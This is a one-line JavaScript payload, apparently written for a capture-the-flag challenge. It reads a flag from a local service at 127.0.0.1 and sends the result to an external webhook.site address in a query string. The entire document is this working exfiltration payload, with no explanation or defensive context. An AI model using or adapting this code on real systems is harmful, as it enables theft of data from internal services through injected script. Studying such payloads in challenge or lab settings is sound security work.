fetch(`http://127.0.0.1/flag`).then((response) => response.json()).then((data) => {fetch(`https://webhook.site/9d0a9c0d-fc05-44f8-a322-01f142608045/?flag=${JSON.stringify(data)}`)})
